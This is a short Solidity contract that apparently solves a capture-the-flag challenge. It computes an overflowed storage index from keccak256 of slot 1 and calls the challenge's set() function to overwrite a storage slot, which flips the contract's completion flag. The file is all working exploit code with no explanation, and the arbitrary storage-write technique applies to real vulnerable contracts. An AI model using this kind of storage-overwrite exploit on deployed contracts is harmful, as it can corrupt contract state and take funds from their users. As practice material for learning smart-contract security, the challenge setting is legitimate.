pragma solidity ^0.4.21;

interface IChallenge {
    function isComplete() external returns(bool);
    function set(uint256 key, uint256 value) external;
}


contract Solution {

    IChallenge challenge;
    uint256 maxUint = 2**256 - 1;
    bytes32 firstSlotHash = keccak256(uint256(1));
    bool public overflown;

    constructor(address _challenge) public {
        challenge = IChallenge(_challenge);
    }

    function getOverflownSlot() internal view returns(uint256) {
        return maxUint - uint256(firstSlotHash) + 1;
    }

    function overFLowChallenge() public {
        uint256 value = 1;
        uint256 storageSlot = getOverflownSlot();
        challenge.set(storageSlot, value);
        overflown = challenge.isComplete();
    }
}
